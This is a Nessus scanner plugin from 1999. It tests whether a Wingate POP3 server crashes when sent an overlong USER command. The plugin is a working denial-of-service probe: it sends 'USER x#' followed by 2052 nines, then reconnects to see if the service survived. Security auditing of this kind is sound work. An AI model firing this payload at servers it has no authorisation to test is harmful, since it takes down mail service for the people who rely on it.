#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10311);
script_cve_id("CVE-1999-0494");
 script_version ("$Revision: 1.16 $");

 
 name["english"] = "Wingate POP3 USER overflow";
 name["francais"] = "Wingate POP3 USER overflow";
 script_name(english:name["english"],
 	     francais:name["francais"]);
 
 desc["english"] = "The remote POP3 server,
which is probably part of Wingate, could
be crashed with the following command :

		USER x#999(...)999
		
This problem may prevent users on your
network from retrieving their emails.
		
Solution : Upgrade.

Risk factor : Medium";

 desc["francais"] = "Le serveur pop3 distant,
appartenant probablement à WinGate, a
pu être planté avec la commande suivante :

		USER x#999(...)999

Ce probleme peut empecher les utilisateurs
de votre réseau de relever leur courrier,
les empechant ainsi de travailler normallement.

Solution : Mettez à jour votre Wingate.

Facteur de risque : Moyen";

 script_description(english:desc["english"],
 		    francais:desc["francais"]);
 
 summary["english"] = "Determines if Wingate POP3 server can be crashed"; 
 summary["francais"] = "Determine si wingate pop3 peut être planté";
 script_summary(english:summary["english"],
 		francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
 		  francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 
 family["english"] = "Denial of Service"; 
 family["francais"] = "Déni de service";
 
 script_family(english:family["english"],
 	       francais:family["francais"]);
 script_dependencie("find_service.nes", "qpopper.nasl");
 script_exclude_keys("pop3/false_pop3");
 script_require_ports("Services/pop3", 110);
 exit(0);
}

#
# The script code starts here
#

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);

port = get_kb_item("Services/pop3");
if(!port) port = 110;

if(get_port_state(port))
{
soc = open_sock_tcp(port);
if(soc)
{
 buffer = recv_line(socket:soc, length:1024);
 if(!buffer)exit(0);
 s = string("USER x#", crap(length:2052, data:"9"), "\r\n");
 send(socket:soc, data:s);
 close(soc);

 soc2 = open_sock_tcp(port);
 if(!soc2)security_warning(port);
 else close(soc2);
}
}
